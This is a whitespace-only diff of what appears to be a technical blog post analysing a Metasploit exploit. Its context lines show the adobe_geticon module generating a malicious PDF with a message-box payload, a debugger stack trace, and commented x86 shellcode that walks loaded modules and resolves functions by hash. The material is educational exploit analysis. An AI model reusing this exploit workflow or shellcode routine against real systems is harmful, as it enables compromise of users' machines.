@@ -13,7 +13,7 @@ msf < use exploit/windows/fileformat/adobe_geticon
 msf exploit(adobe_geticon) < set PAYLOAD windows/messagebox
 PAYLOAD =< windows/messagebox
 msf exploit(adobe_geticon) < exploit
-
+ 
 [*] Creating 'msf.pdf' file...
 [*] Generated output file C:/metasploit/msf3/data/exploits/msf.pdf
 [*] Exploit completed, but no session was created.
@@ -37,7 +37,7 @@ ChildEBP RetAddr
 0012de04 0a11fff2 USER32!MessageBoxA+0x45
 WARNING: Frame IP not in any known module. Following frames may be wrong.
 ...
-
+ 
 < u 0a11fff2
 {% endhighlight %}
 
@@ -54,11 +54,11 @@ next_module:
 	mov esi, [esi]
 	cmp [edi + 12*2], cl
 	jne next_module
-
+ 
 	pop ecx
 	add ecx,edx
 	jmp ecx            ;jmp start_main
-
+ 
 find_function:
 	pushad				;save all registers
 	mov ebp, [esp  +  0x24]	;put base address of module that is being loaded in ebp
@@ -71,7 +71,7 @@ find_function:
 	mov ebx, [edx  +  0x20]		;put names table relative offset in ebx
 	add ebx, ebp			;add base address to it.
 						;ebx = absolute address of names table
-
+ 
 find_function_loop:
 	jecxz  find_function_finished ;if ecx=0, then last symbol has been checked.
 						;(should never happen)
@@ -82,7 +82,7 @@ find_function_loop:
 						;and store offset in esi
 	add esi,  ebp			;add base address.
 						;esi = absolute address of current symbol
-
+ 
 compute_hash:
 	xor edi,  edi			;zero out edi
 	xor eax,  eax			;zero out eax
@@ -101,9 +101,9 @@ compute_hash_again:
 	add edi, eax			;add current character of symbol name
 						;to hash accumulator
 	jmp compute_hash_again		;continue loop
-
+ 
 compute_hash_finished:
-
+ 
 find_function_compare:
 	cmp edi,  [esp  +  0x28]	;see if computed hash matches requested hash
 						; (at esp+0x28)
